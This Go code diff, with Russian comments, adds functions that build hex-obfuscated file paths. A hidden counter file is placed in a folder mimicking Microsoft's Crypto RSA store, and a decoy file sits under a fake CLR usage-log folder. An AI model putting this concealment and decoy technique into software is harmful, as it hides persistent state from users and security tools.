@@ -28,11 +28,11 @@ var (
 )
 
 const (
-	g3N3R1C_R34D         = 0x80000000
-	g3N3R1C_WR1T3        = 0x40000000
-	f1L3_SH4R3_R34D      = 0x1
-	f1L3_SH4R3_WR1T3     = 0x2
-	oP3N_3X1ST1NG        = 3
+	g3N3R1C_R34D          = 0x80000000
+	g3N3R1C_WR1T3         = 0x40000000
+	f1L3_SH4R3_R34D       = 0x1
+	f1L3_SH4R3_WR1T3      = 0x2
+	oP3N_3X1ST1NG         = 3
 	f1L3_4TTR1BUT3_N0RM4L = 0x80
 )
 
@@ -215,12 +215,45 @@ func G3tH1dd3nP4th2() string {
 	return filepath.Join(b4s3, string(p4rt1), string(p4rt2))
 }
 
+// Третий путь для хранения счётчика - %PROGRAMDATA%\Microsoft\Crypto\RSA\.session
+func G3tH1dd3nP4th3() string {
+	p4rt1 := []byte{0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74} // Microsoft
+	p4rt2 := []byte{0x43, 0x72, 0x79, 0x70, 0x74, 0x6f}                   // Crypto
+	p4rt3 := []byte{0x52, 0x53, 0x41}                                     // RSA
+	p4rt4 := []byte{0x2e, 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e}       // .session
+
+	b4s3 := os.Getenv("PROGRAMDATA")
+	if b4s3 == "" {
+		b4s3 = `C:\ProgramData`
+	}
+
+	return filepath.Join(b4s3, string(p4rt1), string(p4rt2), string(p4rt3), string(p4rt4))
+}
+
 func G3tD3c0yP4th() string {
-	// Отвлекающий путь - %USERPROFILE%\.config\taskmanager\settings.dat
-	p4rt1 := []byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67}                                           // .config
-	p4rt2 := []byte{0x74, 0x61, 0x73, 0x6b, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72}                   // taskmanager
-	p4rt3 := []byte{0x73, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x73, 0x2e, 0x64, 0x61, 0x74}             // settings.dat
+	// Отвлекающий путь 1 - %USERPROFILE%\.config\taskmanager\settings.dat
+	p4rt1 := []byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67}                               // .config
+	p4rt2 := []byte{0x74, 0x61, 0x73, 0x6b, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72}       // taskmanager
+	p4rt3 := []byte{0x73, 0x65, 0x74, 0x74, 0x69, 0x6e, 0x67, 0x73, 0x2e, 0x64, 0x61, 0x74} // settings.dat
 
 	b4s3 := os.Getenv("USERPROFILE")
 	return filepath.Join(b4s3, string(p4rt1), string(p4rt2), string(p4rt3))
+}
+
+func G3tD3c0yP4th2() string {
+	// Отвлекающий путь 2 - %LOCALAPPDATA%\Microsoft\CLR_v4.0\UsageLogs\.cache
+	p4rt1 := []byte{0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74} // Microsoft
+	p4rt2 := []byte{0x43, 0x4c, 0x52, 0x5f, 0x76, 0x34, 0x2e, 0x30}       // CLR_v4.0
+	p4rt3 := []byte{0x55, 0x73, 0x61, 0x67, 0x65, 0x4c, 0x6f, 0x67, 0x73} // UsageLogs
+	p4rt4 := []byte{0x2e, 0x63, 0x61, 0x63, 0x68, 0x65}                   // .cache
+
+	b4s3 := os.Getenv("LOCALAPPDATA")
+	if b4s3 == "" {
+		b4s3 = os.Getenv("USERPROFILE")
+		if b4s3 != "" {
+			b4s3 = filepath.Join(b4s3, "AppData", "Local")
+		}
+	}
+
+	return filepath.Join(b4s3, string(p4rt1), string(p4rt2), string(p4rt3), string(p4rt4))
 }
